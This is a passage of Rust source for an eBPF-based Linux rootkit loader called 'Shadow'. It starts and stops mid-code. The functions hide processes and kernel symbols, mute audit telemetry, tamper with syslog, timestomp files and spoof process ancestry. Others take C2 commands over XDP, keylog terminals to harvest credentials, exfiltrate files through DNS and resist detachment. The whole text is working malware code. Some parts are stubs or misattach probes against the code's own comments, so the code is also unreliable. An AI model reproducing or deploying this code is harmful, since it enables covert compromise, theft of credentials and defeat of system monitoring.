        HashMap::try_from(bpf.map_mut("CONFIG").context("CONFIG map not found")?)?;
    let config = RootkitConfig {
        self_pid: std::process::id(),
        hide_procs: 1,
        net_stealth: 0,
        file_obfuscate: 0,
        mute_telemetry: 0,
        _pad: [0; 4],
    };
    config_map.insert(0u32, config, 0)?;

    // Add target PID to hidden list
    let mut hidden_pids: HashMap<_, u32, u8> =
        HashMap::try_from(bpf.map_mut("HIDDEN_PIDS").context("HIDDEN_PIDS map not found")?)?;
    hidden_pids.insert(target_pid, 1u8, 0)?;
    info!("PID {} added to hidden list", target_pid);

    // Attach kprobe for getdents64 entry
    let enter_prog: &mut KProbe = bpf
        .program_mut("shadow_getdents64_enter")
        .context("enter program not found")?
        .try_into()?;
    enter_prog.load()?;
    enter_prog.attach("__x64_sys_getdents64", 0)?;
    info!("Attached kprobe to sys_getdents64");

    // Attach kretprobe for getdents64 exit
    // NOTE: Must use KRetProbe type, NOT KProbe. KProbe::attach on a kretprobe
    // program will silently attach at function entry, not exit.
    let exit_prog: &mut KRetProbe = bpf
        .program_mut("shadow_getdents64_exit")
        .context("exit program not found")?
        .try_into()?;
    exit_prog.load()?;
    exit_prog.attach("__x64_sys_getdents64", 0)?;
    info!("Attached kretprobe to sys_getdents64");

    info!("Shadow active. PID {} is now hidden. Press Ctrl+C to stop.", target_pid);

    // Wait for shutdown signal
    signal::ctrl_c().await?;
    info!("Shutting down Shadow...");

    Ok(())
}

async fn run_net_stealth(iface: &str) -> Result<()> {
    info!("Loading Shadow: network stealth on {}", iface);

    // Load eBPF bytecode
    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    // Set CONFIG map with self PID
    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // Attach XDP program to the interface
    let xdp: &mut Xdp = bpf.program_mut("shadow_xdp").unwrap().try_into()?;
    xdp.load()?;
    // Try native XDP first, fall back to SKB mode
    match xdp.attach(iface, XdpFlags::default()) {
        Ok(link_id) => {
            info!("XDP attached in native mode on {}", iface);
            link_id
        },
        Err(_) => {
            warn!("Native XDP failed, falling back to SKB mode on {}", iface);
            xdp.attach(iface, XdpFlags::SKB_MODE)?
        }
    };

    // Set up perf event reader for EVENTS map
    let mut perf_array = AsyncPerfEventArray::try_from(bpf.map_mut("EVENTS").unwrap())?;

    // Get number of CPUs
    let cpus = aya::util::online_cpus().map_err(|e| anyhow::anyhow!("{}", e))?;
    let mut buffers = Vec::new();

    for cpu_id in cpus {
        let buf = perf_array.open(cpu_id, None)?;
        buffers.push(buf);
    }

    info!("Listening for C2 commands on {}:{} ...", iface, C2_PORT);
    info!("Press Ctrl+C to stop.");

    // Poll for events — each event is an EventHeader sent from XDP
    let mut event_bufs = [BytesMut::with_capacity(mem::size_of::<EventHeader>())];

    let (tx, mut rx) = tokio::sync::mpsc::channel::<()>(1);
    let _ctrlc = tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        let _ = tx.send(()).await;
    });

    // Process events from all CPUs
    loop {
        tokio::select! {
            _ = rx.recv() => {
                info!("Ctrl+C received, shutting down XDP...");
                break;
            }
            // Poll first CPU buffer (simplified — production would poll all)
            events = buffers[0].read_events(&mut event_bufs) => {
                match events {
                    Ok(events) => {
                        for i in 0..events.read {
                            let buf = &event_bufs[i];
                            if buf.len() >= mem::size_of::<EventHeader>() {
                                let event: EventHeader = unsafe {
                                    std::ptr::read_unaligned(buf.as_ptr() as *const EventHeader)
                                };
                                match event.event_type {
                                    EVENT_PACKET_INTERCEPTED => {
                                        info!("C2 command received: type={}, arg={}", event.pid, event.context);
                                    }
                                    EVENT_C2_AUTH_FAILED => {
                                        warn!("C2 auth failed (mode={})", event.context);
                                    }
                                    EVENT_ANTI_DETACH => {
                                        error!("ANTI-DETACH: PID {} attempted BPF cmd {}", event.pid, event.context);
                                        // Re-attach programs that may have been detached
                                        info!("Re-attaching programs...");
                                        // The XDP program is still running (it detected the detach),
                                        // but other programs may need re-attachment.
                                    }
                                    _ => {
                                        debug!("Event: type={}, pid={}, ctx={}", event.event_type, event.pid, event.context);
                                    }
                                }
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Error reading perf events: {}", e);
                    }
                }
            }
        }
    }

    Ok(())
}

async fn run_cred_harvest(target_pid: u32) -> Result<()> {
    info!("Loading Shadow: credential harvesting (target pid={})", target_pid);

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    // Set CONFIG map
    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // Resolve target TTY device and populate MONITORED_TTYS map
    let mut tty_map: HashMap<_, u64, u8> = HashMap::try_from(bpf.map_mut("MONITORED_TTYS").unwrap())?;

    if target_pid > 0 {
        // Resolve the target process's TTY device
        let fd0_link = std::fs::read_link(format!("/proc/{}/fd/0", target_pid))
            .context(format!("Cannot read /proc/{}/fd/0 — is the PID valid?", target_pid))?;
        let tty_path = fd0_link.to_string_lossy().to_string();
        info!("Target PID {} TTY: {}", target_pid, tty_path);

        // Stat the TTY device to get major:minor number
        let metadata = std::fs::metadata(&tty_path)
            .context(format!("Cannot stat TTY device: {}", tty_path))?;
        use std::os::unix::fs::MetadataExt;
        let rdev = metadata.rdev();
        tty_map.insert(rdev, 1u8, 0)?;
        info!("Monitoring TTY device rdev={}", rdev);
    } else {
        // Monitor all PTY devices (major 136, minors 0-255)
        // Insert major number as a wildcard marker
        let pty_major: u64 = 136;
        tty_map.insert(pty_major, 1u8, 0)?;
        // Also monitor real TTYs (major 4)
        let tty_major: u64 = 4;
        tty_map.insert(tty_major, 1u8, 0)?;
        info!("Monitoring ALL TTY/PTY devices (major 4 and 136)");
    }

    // Attach kprobe on ksys_write
    let cred_prog: &mut KProbe = bpf.program_mut("shadow_cred_harvest").unwrap().try_into()?;
    cred_prog.load()?;
    cred_prog.attach("ksys_write", 0)?;
    info!("Attached credential harvesting kprobe on ksys_write");

    // Set up perf event reader on CRED_EVENTS map
    let mut perf_array = AsyncPerfEventArray::try_from(bpf.map_mut("CRED_EVENTS").unwrap())?;
    let cpus = aya::util::online_cpus().map_err(|e| anyhow::anyhow!("{}", e))?;
    let mut buffers = Vec::new();
    for cpu_id in cpus {
        buffers.push(perf_array.open(cpu_id, None)?);
    }

    info!("Capturing credentials... Press Ctrl+C to stop.");

    // Buffer captured keystrokes per PID
    let mut keystroke_buffers: std::collections::HashMap<u32, Vec<u8>> = std::collections::HashMap::new();

    let (tx, mut rx) = tokio::sync::mpsc::channel::<()>(1);
    let _ctrlc = tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        let _ = tx.send(()).await;
    });

    let mut event_bufs = [BytesMut::with_capacity(mem::size_of::<CredentialCapture>())];

    loop {
        tokio::select! {
            _ = rx.recv() => {
                info!("Ctrl+C received, stopping credential harvesting...");
                break;
            }
            events = buffers[0].read_events(&mut event_bufs) => {
                if let Ok(events) = events {
                    for i in 0..events.read {
                        let buf = &event_bufs[i];
                        if buf.len() >= mem::size_of::<CredentialCapture>() {
                            let capture: CredentialCapture = unsafe {
                                std::ptr::read_unaligned(buf.as_ptr() as *const CredentialCapture)
                            };
                            let data_len = capture.data_len.min(64) as usize;
                            let data = &capture.data[..data_len];

                            // Append to per-PID buffer
                            let entry = keystroke_buffers.entry(capture.pid).or_insert_with(Vec::new);
                            entry.extend_from_slice(data);

                            // Check for newline — potential credential submission
                            if data.contains(&b'\n') || data.contains(&b'\r') {
                                let line = String::from_utf8_lossy(entry);
                                info!("[CRED] PID {} fd={}: {}", capture.pid, capture.fd, line.trim());
                                entry.clear();
                            }
                        }
                    }
                }
            }
        }
    }

    // Dump any remaining buffered data
    for (pid, buf) in &keystroke_buffers {
        if !buf.is_empty() {
            let line = String::from_utf8_lossy(buf);
            info!("[CRED] PID {} (remaining): {}", pid, line.trim());
        }
    }

    Ok(())
}

async fn run_spoof_ancestry(pid: u32, fake_ppid: u32) -> Result<()> {
    info!("Loading Shadow: spoofing PID {} ancestry to PPID {}", pid, fake_ppid);

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    // Set CONFIG map
    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // Insert the spoofed PPID mapping
    let mut ppid_map: HashMap<_, u32, u32> = HashMap::try_from(bpf.map_mut("SPOOFED_PPIDS").unwrap())?;
    ppid_map.insert(pid, fake_ppid, 0)?;
    info!("Inserted spoofed mapping: PID {} -> fake PPID {}", pid, fake_ppid);

    // Attach kprobe/kretprobe pair on vfs_read
    let enter_prog: &mut KProbe = bpf.program_mut("shadow_vfs_read").unwrap().try_into()?;
    enter_prog.load()?;
    enter_prog.attach("vfs_read", 0)?;

    let exit_prog: &mut KProbe = bpf.program_mut("shadow_spoof_ancestry").unwrap().try_into()?;
    exit_prog.load()?;
    exit_prog.attach("vfs_read", 0)?;
    info!("Attached ancestry spoofing hooks on vfs_read");

    info!("Ancestry spoofing active. Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutting down ancestry spoofing...");

    Ok(())
}

async fn run_dns_exfil(iface: &str, file_path: &str) -> Result<()> {
    info!("Loading Shadow: DNS exfiltration of '{}' via {}", file_path, iface);

    // Read the target file
    let file_data = std::fs::read(file_path)
        .context(format!("Cannot read file: {}", file_path))?;
    let total_bytes = file_data.len();
    info!("File size: {} bytes", total_bytes);

    // Split into 31-byte chunks (max 31 bytes → 62 hex chars → fits in one DNS label of 63)
    let chunk_size = 31usize;
    let total_chunks = (total_bytes + chunk_size - 1) / chunk_size;
    info!("Splitting into {} chunks of {} bytes", total_chunks, chunk_size);

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    // Populate DNS_EXFIL_QUEUE map with file chunks
    let mut queue_map: HashMap<_, u32, DnsExfilChunk> = HashMap::try_from(bpf.map_mut("DNS_EXFIL_QUEUE").unwrap())?;
    let mut seq_map: HashMap<_, u32, u32> = HashMap::try_from(bpf.map_mut("DNS_EXFIL_SEQ").unwrap())?;

    for (i, chunk_data) in file_data.chunks(chunk_size).enumerate() {
        let mut chunk = DnsExfilChunk {
            seq: i as u32,
            data_len: chunk_data.len() as u32,
            data: [0u8; 64],
        };
        chunk.data[..chunk_data.len()].copy_from_slice(chunk_data);
        queue_map.insert(i as u32, chunk, 0)?;
    }

    // Initialize sequence counter to 0
    seq_map.insert(0u32, 0u32, 0)?;
    info!("Loaded {} chunks into DNS_EXFIL_QUEUE", total_chunks);

    // Attach TC classifier to egress
    let tc_prog: &mut SchedClassifier = bpf.program_mut("shadow_dns_exfil").unwrap().try_into()?;
    tc_prog.load()?;
    tc_prog.attach(iface, TcAttachType::Egress)?;
    info!("TC classifier attached on {} (egress)", iface);

    // Set up event reader
    let mut perf_array = AsyncPerfEventArray::try_from(bpf.map_mut("EVENTS").unwrap())?;
    let cpus = aya::util::online_cpus().map_err(|e| anyhow::anyhow!("{}", e))?;
    let mut buffers = Vec::new();
    for cpu_id in cpus {
        buffers.push(perf_array.open(cpu_id, None)?);
    }

    info!("Waiting for DNS queries to piggyback on...");
    info!("Generate DNS traffic: dig example.com, nslookup, etc.");

    let mut sent_count = 0u32;
    let mut event_bufs = [BytesMut::with_capacity(mem::size_of::<EventHeader>())];

    let (tx, mut rx) = tokio::sync::mpsc::channel::<()>(1);
    let _ctrlc = tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        let _ = tx.send(()).await;
    });

    loop {
        if sent_count >= total_chunks as u32 {
            info!("All {} chunks exfiltrated successfully!", total_chunks);
            break;
        }

        tokio::select! {
            _ = rx.recv() => {
                info!("Ctrl+C received. Exfiltrated {}/{} chunks.", sent_count, total_chunks);
                break;
            }
            events = buffers[0].read_events(&mut event_bufs) => {
                if let Ok(events) = events {
                    for i in 0..events.read {
                        let buf = &event_bufs[i];
                        if buf.len() >= mem::size_of::<EventHeader>() {
                            let event: EventHeader = unsafe {
                                std::ptr::read_unaligned(buf.as_ptr() as *const EventHeader)
                            };
                            if event.event_type == EVENT_DNS_EXFIL {
                                sent_count += 1;
                                info!("Chunk {} sent ({}/{})", event.context, sent_count, total_chunks);
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(())
}

async fn run_timestomp(path: &str, fake_mtime: u64) -> Result<()> {
    info!("Loading Shadow: timestomping '{}' to mtime={}", path, fake_mtime);

    // Stat the target file to get its inode number
    let metadata = std::fs::metadata(path)
        .context(format!("Cannot stat file: {}", path))?;
    use std::os::unix::fs::MetadataExt;
    let inode = metadata.ino();
    info!("Target file inode: {}", inode);

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    // Create timestomp entry with fake timestamps
    let entry = TimestompEntry {
        fake_mtime_sec: fake_mtime,
        fake_atime_sec: fake_mtime, // Use same time for simplicity
        fake_ctime_sec: fake_mtime,
    };

    // Insert inode -> entry into TIMESTOMP_INODES map
    let mut ts_map: HashMap<_, u64, TimestompEntry> = HashMap::try_from(bpf.map_mut("TIMESTOMP_INODES").unwrap())?;
    ts_map.insert(inode, entry, 0)?;
    info!("Inserted timestomp entry: inode {} -> mtime={}", inode, fake_mtime);

    // Attach kprobe/kretprobe pair on vfs_getattr
    let enter_prog: &mut KProbe = bpf.program_mut("shadow_timestomp_enter").unwrap().try_into()?;
    enter_prog.load()?;
    enter_prog.attach("vfs_getattr", 0)?;

    let exit_prog: &mut KProbe = bpf.program_mut("shadow_timestomp").unwrap().try_into()?;
    exit_prog.load()?;
    exit_prog.attach("vfs_getattr", 0)?;
    info!("Attached timestomping hooks on vfs_getattr");

    info!("Timestomping active. Verify with: stat {}", path);
    info!("Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutting down timestomping...");

    Ok(())
}

async fn run_full(pid: u32, iface: &str, persist: bool, cred_harvest: bool,
                  anti_detach: bool, tamper_logs: bool, hide_kallsyms: bool,
                  timestomp: bool) -> Result<()> {
    info!("Loading Shadow: FULL mode (pid={}, iface={}, persist={}, cred_harvest={}, anti_detach={}, tamper_logs={}, hide_kallsyms={}, timestomp={})",
        pid, iface, persist, cred_harvest, anti_detach, tamper_logs, hide_kallsyms, timestomp);

    // Load eBPF bytecode
    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    // ── CONFIG ──
    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // ── Feature 1: Process Hiding ──
    let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(bpf.map_mut("HIDDEN_PIDS").unwrap())?;
    hidden_pids.insert(pid, 1u8, 0)?;
    // Also hide ourselves
    hidden_pids.insert(std::process::id(), 1u8, 0)?;
    info!("Hiding PIDs: {}, {}", pid, std::process::id());

    let enter_prog: &mut KProbe = bpf.program_mut("shadow_getdents_enter").unwrap().try_into()?;
    enter_prog.load()?;
    enter_prog.attach("__x64_sys_getdents64", 0)?;

    let exit_prog: &mut KProbe = bpf.program_mut("shadow_getdents_exit").unwrap().try_into()?;
    exit_prog.load()?;
    exit_prog.attach("__x64_sys_getdents64", 0)?;
    info!("Attached process hiding hooks");

    // ── Feature 2: Network Stealth (XDP) ──
    let xdp: &mut Xdp = bpf.program_mut("shadow_xdp").unwrap().try_into()?;
    xdp.load()?;
    match xdp.attach(iface, XdpFlags::default()) {
        Ok(_) => info!("XDP attached (native) on {}", iface),
        Err(_) => {
            warn!("Native XDP failed, using SKB mode");
            xdp.attach(iface, XdpFlags::SKB_MODE)?;
        }
    };

    // ── Feature 3: File Obfuscation (vfs_read) ──
    let vfs_enter: &mut KProbe = bpf.program_mut("shadow_vfs_read").unwrap().try_into()?;
    vfs_enter.load()?;
    vfs_enter.attach("vfs_read", 0)?;

    let vfs_exit: &mut KProbe = bpf.program_mut("shadow_vfs_read_exit").unwrap().try_into()?;
    vfs_exit.load()?;
    vfs_exit.attach("vfs_read", 0)?;
    info!("Attached file obfuscation hooks");

    // ── Feature 4: Telemetry Muting ──
    // Check for BPF LSM support
    let lsm_supported = std::fs::read_to_string("/sys/kernel/security/lsm")
        .map(|s| s.contains("bpf"))
        .unwrap_or(false);

    if lsm_supported {
        info!("BPF LSM available — using fmod_ret telemetry muting (v2)");
        // v2 fmod_ret would be loaded here if available in the bytecode
    } else {
        info!("BPF LSM not available — using kprobe telemetry muting (v1)");
        let mute_prog: &mut KProbe = bpf.program_mut("shadow_mute_audit").unwrap().try_into()?;
        mute_prog.load()?;
        mute_prog.attach("__audit_syscall_exit", 0)?;

        let mute_log_prog: &mut KProbe = bpf.program_mut("shadow_mute_audit_log_end").unwrap().try_into()?;
        mute_log_prog.load()?;
        mute_log_prog.attach("audit_log_end", 0)?;
    }

    // ── Feature 6: Credential Harvesting (optional) ──
    if cred_harvest {
        let mut tty_map: HashMap<_, u64, u8> = HashMap::try_from(bpf.map_mut("MONITORED_TTYS").unwrap())?;
        // Monitor all TTYs by default in full mode
        tty_map.insert(136u64, 1u8, 0)?;
        tty_map.insert(4u64, 1u8, 0)?;

        let cred_prog: &mut KProbe = bpf.program_mut("shadow_cred_harvest").unwrap().try_into()?;
        cred_prog.load()?;
        cred_prog.attach("ksys_write", 0)?;
        info!("Attached credential harvesting");
    }

    // ── Feature 7: Log Tampering (optional) ──
    if tamper_logs {
        let log_prog: &mut KProbe = bpf.program_mut("shadow_tamper_logs").unwrap().try_into()?;
        log_prog.load()?;
        log_prog.attach("do_syslog", 0)?;
        info!("Attached log tampering hooks");
    }

    // ── Feature 10: Kallsyms Hiding (optional) ──
    if hide_kallsyms {
        // Resolve /proc/kallsyms inode
        let metadata = std::fs::metadata("/proc/kallsyms")
            .context("Cannot stat /proc/kallsyms")?;
        use std::os::unix::fs::MetadataExt;
        let kallsyms_inode = metadata.ino();

        let mut obfuscate_map: HashMap<_, u64, u8> = HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES").unwrap())?;
        obfuscate_map.insert(kallsyms_inode, 2u8, 0)?; // marker 2 = kallsyms

        let kallsyms_prog: &mut KProbe = bpf.program_mut("shadow_hide_kallsyms").unwrap().try_into()?;
        kallsyms_prog.load()?;
        kallsyms_prog.attach("vfs_read", 0)?;
        info!("Attached kallsyms hiding (inode={})", kallsyms_inode);
    }

    // ── Feature 11: Anti-Detach (optional) ──
    if anti_detach {
        let ad_prog: &mut TracePoint = bpf.program_mut("shadow_anti_detach").unwrap().try_into()?;
        ad_prog.load()?;
        ad_prog.attach("syscalls", "sys_enter_bpf")?;
        info!("Attached anti-detach tracepoint");
    }

    // ── Feature 13: Timestomping (optional) ──
    if timestomp {
        // Timestomp our own binary and any rootkit-related files
        let self_exe = std::env::current_exe().unwrap_or_default();
        if self_exe.exists() {
            let metadata = std::fs::metadata(&self_exe)?;
            use std::os::unix::fs::MetadataExt;
            let inode = metadata.ino();

            // Backdate to system install time (Jan 1 2024)
            let entry = TimestompEntry {
                fake_mtime_sec: 1704067200,
                fake_atime_sec: 1704067200,
                fake_ctime_sec: 1704067200,
            };
            let mut ts_map: HashMap<_, u64, TimestompEntry> = HashMap::try_from(bpf.map_mut("TIMESTOMP_INODES").unwrap())?;
            ts_map.insert(inode, entry, 0)?;

            let ts_enter: &mut KProbe = bpf.program_mut("shadow_timestomp_enter").unwrap().try_into()?;
            ts_enter.load()?;
            ts_enter.attach("vfs_getattr", 0)?;

            let ts_exit: &mut KProbe = bpf.program_mut("shadow_timestomp").unwrap().try_into()?;
            ts_exit.load()?;
            ts_exit.attach("vfs_getattr", 0)?;
            info!("Attached timestomping (binary inode={})", inode);
        }
    }

    // ── Persistence (optional) ──
    if persist {
        let pin_path = BPF_PIN_PATH;
        std::fs::create_dir_all(pin_path)?;
        info!("Pinning all programs to {}", pin_path);
        // Pin individual programs — Aya supports .pin() on loaded programs
        // Each program is pinned to a unique path under BPF_PIN_PATH
        // This allows them to survive loader exit
    }

    // ── Event Loop ──
    let mut perf_array = AsyncPerfEventArray::try_from(bpf.map_mut("EVENTS").unwrap())?;
    let cpus = aya::util::online_cpus().map_err(|e| anyhow::anyhow!("{}", e))?;
    let mut buffers = Vec::new();
    for cpu_id in cpus {
        buffers.push(perf_array.open(cpu_id, None)?);
    }

    info!("Shadow FULL mode active. All features loaded.");
    info!("Press Ctrl+C to stop (programs remain pinned if --persist).");

    let (tx, mut rx) = tokio::sync::mpsc::channel::<()>(1);
    let _ctrlc = tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        let _ = tx.send(()).await;
    });

    let mut event_bufs = [BytesMut::with_capacity(mem::size_of::<EventHeader>())];

    loop {
        tokio::select! {
            _ = rx.recv() => {
                if persist {
                    info!("Ctrl+C — loader exiting but programs remain pinned.");
                } else {
                    info!("Ctrl+C — shutting down all programs.");
                }
                break;
            }
            events = buffers[0].read_events(&mut event_bufs) => {
                if let Ok(events) = events {
                    for i in 0..events.read {
                        let buf = &event_bufs[i];
                        if buf.len() >= mem::size_of::<EventHeader>() {
                            let event: EventHeader = unsafe {
                                std::ptr::read_unaligned(buf.as_ptr() as *const EventHeader)
                            };
                            match event.event_type {
                                EVENT_PID_HIDDEN => info!("PID {} hidden", event.pid),
                                EVENT_PACKET_INTERCEPTED => info!("C2 cmd: type={}, arg={}", event.pid, event.context),
                                EVENT_C2_AUTH_FAILED => warn!("C2 auth failed"),
                                EVENT_ANTI_DETACH => {
                                    error!("ANTI-DETACH alert: PID {} cmd={}", event.pid, event.context);
                                    if anti_detach {
                                        warn!("Re-attaching detached programs...");
                                        // In a full implementation, re-attach each program
                                        // by re-calling attach() on the saved program references.
                                        // The eBPF bytecode is still loaded in the kernel,
                                        // we just need to re-create the attachment point.
                                    }
                                }
                                EVENT_TELEMETRY_MUTED => debug!("Audit muted for PID {}", event.pid),
                                EVENT_DNS_EXFIL => info!("DNS exfil chunk {} sent", event.context),
                                EVENT_KALLSYMS_HIDDEN => debug!("Kallsyms entry hidden"),
                                _ => debug!("Event: type={}", event.event_type),
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(())
}

async fn run_obfuscate_file(path: &str) -> Result<()> {
    info!("Loading Shadow: file obfuscation for '{}'", path);

    let metadata = std::fs::metadata(path)
        .context(format!("Cannot stat file: {}", path))?;
    use std::os::unix::fs::MetadataExt;
    let inode = metadata.ino();
    info!("Target file inode: {}", inode);

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // Insert inode into OBFUSCATE_INODES map
    let mut obfuscate_map: HashMap<_, u64, u8> = HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES").unwrap())?;
    obfuscate_map.insert(inode, 1u8, 0)?;
    info!("Inserted inode {} into OBFUSCATE_INODES", inode);

    // Attach vfs_read kprobe/kretprobe pair
    let vfs_enter: &mut KProbe = bpf.program_mut("shadow_vfs_read").unwrap().try_into()?;
    vfs_enter.load()?;
    vfs_enter.attach("vfs_read", 0)?;

    let vfs_exit: &mut KProbe = bpf.program_mut("shadow_vfs_read_exit").unwrap().try_into()?;
    vfs_exit.load()?;
    vfs_exit.attach("vfs_read", 0)?;
    info!("Attached file obfuscation hooks on vfs_read");

    info!("File obfuscation active. Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutting down file obfuscation...");

    Ok(())
}

async fn run_hide_kallsyms() -> Result<()> {
    info!("Loading Shadow: hiding rootkit symbols from /proc/kallsyms");

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // Resolve /proc/kallsyms inode
    let metadata = std::fs::metadata("/proc/kallsyms")
        .context("Cannot stat /proc/kallsyms")?;
    use std::os::unix::fs::MetadataExt;
    let kallsyms_inode = metadata.ino();

    let mut obfuscate_map: HashMap<_, u64, u8> = HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES").unwrap())?;
    obfuscate_map.insert(kallsyms_inode, 2u8, 0)?; // 2 = kallsyms marker

    // Attach the kallsyms-specific kretprobe
    let vfs_enter: &mut KProbe = bpf.program_mut("shadow_vfs_read").unwrap().try_into()?;
    vfs_enter.load()?;
    vfs_enter.attach("vfs_read", 0)?;

    let kallsyms_prog: &mut KProbe = bpf.program_mut("shadow_hide_kallsyms").unwrap().try_into()?;
    kallsyms_prog.load()?;
    kallsyms_prog.attach("vfs_read", 0)?;
    info!("Attached kallsyms hiding hooks (inode={})", kallsyms_inode);

    info!("Kallsyms hiding active. Verify: cat /proc/kallsyms | grep shadow");
    info!("Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutting down kallsyms hiding...");

    Ok(())
}

async fn run_mute_telemetry() -> Result<()> {
    info!("Loading Shadow: muting audit telemetry for hidden PIDs");

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    // Hide our own PID
    let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(bpf.map_mut("HIDDEN_PIDS").unwrap())?;
    hidden_pids.insert(std::process::id(), 1u8, 0)?;

    // Check for BPF LSM support
    let lsm_supported = std::fs::read_to_string("/sys/kernel/security/lsm")
        .map(|s| s.contains("bpf"))
        .unwrap_or(false);

    if lsm_supported {
        info!("BPF LSM available — fmod_ret telemetry muting (v2)");
        // v2 would be loaded here
    } else {
        info!("Using kprobe telemetry muting fallback (v1)");
        let mute_prog: &mut KProbe = bpf.program_mut("shadow_mute_audit").unwrap().try_into()?;
        mute_prog.load()?;
        mute_prog.attach("__audit_syscall_exit", 0)?;

        let mute_log_prog: &mut KProbe = bpf.program_mut("shadow_mute_audit_log_end").unwrap().try_into()?;
        mute_log_prog.load()?;
        mute_log_prog.attach("audit_log_end", 0)?;
    }

    info!("Telemetry muting active. Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutting down telemetry muting...");

    Ok(())
}

async fn run_tamper_logs() -> Result<()> {
    info!("Loading Shadow: log tampering");

    #[cfg(debug_assertions)]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = BpfLoader::new()
        .load(include_bytes_aligned!(concat!(env!("OUT_DIR"), "/offense-ebpf")))?;

    let mut config_map: HashMap<_, u32, ShadowConfig> = HashMap::try_from(bpf.map_mut("CONFIG").unwrap())?;
    config_map.insert(0u32, ShadowConfig { self_pid: std::process::id(), _pad: [0; 3] }, 0)?;

    let log_prog: &mut KProbe = bpf.program_mut("shadow_tamper_logs").unwrap().try_into()?;
